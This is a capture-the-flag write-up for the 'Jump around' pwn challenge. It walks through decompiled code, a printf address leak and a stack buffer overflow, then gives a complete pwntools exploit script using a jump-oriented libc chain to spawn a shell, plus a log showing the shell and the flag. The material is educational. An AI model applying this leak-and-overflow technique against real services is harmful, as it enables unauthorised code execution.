# Jump around :mushroom:

### Description: 

* Exploring the exotic and magical forest searching for mushrooms, you find a path full of them! Collect some and return home safe! Warning! Some of them are poisonous..

### Objective:

* Take advantage of *BufferOverflow* and use *jump-oriented programming* to spawn shell.

### Flag: :black_flag:

* UNIWA{h4v3_U_s33n_mY_b34R_T1Bb3Rs??}

### Challenge:

We run `checksec` to see what protection are enabled:

```gdb
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

* **PIE** is *enabled*.
* **NX** is *enabled*.
* **Canary** is *disabled*.

The interface of the program looks like this:

```sh
🍄 Hop! Skip! Jump! Beware of the poisonous mushrooms!! 🍄

Total 🍄 collected: [0]
1. Hop!
2. Skip!
3. Jump!
> 1
Hopped! [+3].

Total 🍄 collected: [3]
1. Hop!
2. Skip!
3. Jump!
> 2
Skipped a shrooms! [-1].

Total 🍄 collected: [2]
1. Hop!
2. Skip!
3. Jump!
> 3
Jumped! [+3].

Total 🍄 collected: [5]
1. Hop!
2. Skip!
3. Jump!
> 3
Jumped! [+3].

Total 🍄 collected: [8]
1. Hop!
2. Skip!
3. Jump!
> 1
Hopped! [+3].

Total 🍄 collected: [11]
1. Hop!
2. Skip!
3. Jump!
> random 
Invalid option!
You stepped on a poisonous mushroom! ☠
```

### Disassembly :pick:

Starting from `main()`:

```c
void main(void)

{
  setup();
  puts("\n🍄 Hop! Skip! Jump! Beware of the poisonous mushrooms!! 🍄");
  do {
    mushrooms();
  } while( true );
}
```

There is an endless loop and a call to `mushroom()`.

#### mushroom() :mushroom:

```c
void mushrooms(void)

{
  int local_c;
  
  local_c = 0;
  printf("\nTotal 🍄 collected: [%d]",(ulong)shrooms);
  write(1,"\n1. Hop!\n2. Skip!\n3. Jump!\n> ",0x1d);
  __isoc99_scanf(&DAT_00100d76,&local_c);
  if (local_c == 2) {
    skip();
  }
  else {
    if (local_c == 3) {
      jump();
    }
    else {
      if (local_c != 1) {
        fwrite(&DAT_00100d80,1,0x39,stderr);
                    /* WARNING: Subroutine does not return */
        exit(0x122);
      }
      hop();
    }
  }
  return;
}
```

 We see that this function calls:

* **hop()** - Option 1
* **skip()** - Option 2
* **jump()** - Option 3

Taking a look at each of them:

**Option 1** - `hop()`:

```c
void hop(void)

{
  shrooms = shrooms + 3;
  check_shrooms((ulong)shrooms);
  fwrite("Hopped! [+3].\n",1,0xe,stdout);
  if (shrooms == 0x10) {
    printf("Bonus item: [%p]\n",printf);
  }
  return;
}
```

We already found a treasure here!

We see that there is a leak of `printf()`!

In order to leak the address, we need to have exactly 0x10 (16 in dec) shrooms.

Each time `hop()` is called, it adds 3 shrooms.

That means we can calculate `libc_base`.

There is also a `check_shrooms()`function that checks if the shrooms are negative or more than 0x17 and if so, it exits the program.

```c
void check_shrooms(int param_1)

{
  if ((-1 < param_1) && (param_1 < 0x17)) {
    return;
  }
  fwrite("You will get tired with all these hops and jumps!\nTake a break!\n",1,0x40,stderr);
                    /* WARNING: Subroutine does not return */
  exit(0x22);
}
```

**Option 2** - `skip()`:

Same as `hop()`, but this time, it subtracts 1 shroom.

```c
void skip(void)

{
  shrooms = shrooms - 1;
  check_shrooms((ulong)shrooms);
  fwrite("Skipped a shrooms! [-1].\n",1,0x19,stdout);
  return;
}
```

**Option 3** - `jump()`:

Like `hop()`, it adds 3 shrooms. 

If we have 0x14 (20) shrooms, it prompt us to a vulnerable `read()`.

Our buffer is 32 bytes long and `read()` can read up to 0x60 (96) bytes.

So, our goal is:

* Collect 16 shrooms to leak `printf()`.
* Find the correct libc (or given).
* Calculate libc_base.
* Put the address of `system()` into `$rax` with `pop rax;` gadget.
* Put the address of `"/bin/sh"` into `$rdi` and call `system()` with `pop rdi; jmp rax;` gadget.

### Exploit :scroll:

```python
#!/usr/bin/python3
from pwn import *

ip = 'ctf.uniwa.gr'
port = 31454 	  
fname = './jump_around' 
LOCAL = False

if LOCAL:
	r = process(fname)
	_libc = '/lib/x86_64-linux-gnu/libc.so.6'
	libc = ELF(_libc)
else:
	r = remote(ip, port)
	_libc = './libc.so.6'
	libc = ELF(_libc)

e = ELF(fname)

ru = lambda x : r.recvuntil(x)
inter = lambda : r.interactive()
sla = lambda x,y : r.sendlineafter(x,y)

def hop():
	sla('>', '1')

def skip():
	sla('>', '2')

def jump(payload):
	sla('>', '3')
	sla('>', payload)
	inter()

def pwn():
	libc_pop_rax = 0x43ae8
	libc_pop_rdi_jmp_rax = 0x98b2a
	shrooms = 0
	junk = b"A"*40

	# Call hop 6 times to make counter 15.
	for i in range(5):
		shrooms += 3
		hop()

	# Make counter 12.
	for i in range(2):
		shrooms -= 1
		skip()

	# Make counter 16 to leak libc.
	hop()
	shrooms += 3
	ru('Bonus item: [')
	leaked = int(ru(']')[:-1], 16)
	base = leaked - libc.symbols['printf']
	libc_pop_rax += base
	libc_pop_rdi_jmp_rax += base
	log.info('Leaked printf: 0x{:x}'.format(leaked))
	log.info('Libc base:     0x{:x}'.format(base))

	# Make counter 14 so it becomes 17 with a hop and 20 when enters the jump()
	for i in range(2):
		shrooms -= 1
		skip()

	hop()
	shrooms += 3
	log.info('Total \U0001F344: {}'.format(shrooms))
	payload = junk 

	# Ret2libc
	# payload += p64(0x215bf + base) # pop rdi
	# payload += p64(next(libc.search(b'/bin/sh')) + base)
	# payload += p64(base + 0x8aa) # ret
	# payload += p64(libc.symbols['system'] + base)
	####

	# JOP
	payload += p64(libc_pop_rax)
	payload += p64(libc.symbols['system'] + base)
	payload += p64(libc_pop_rdi_jmp_rax)
	payload += p64(next(libc.search(b'/bin/sh')) + base)
	
	jump(payload)

if __name__ == '__main__':
	pwn()
```

### PoC :crossed_flags:

```sh
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
[*] '/home/w3th4nds/github/pwn/Jump_around/challenge/jump_around'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leaked printf: 0x7f37ffeb6f00
[*] Libc base:     0x7f37ffe52000
[*] Total 🍄: 17
[*] Switching to interactive mode
 $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
UNIWA{h4v3_U_s33n_mY_b34R_T1Bb3Rs??}
```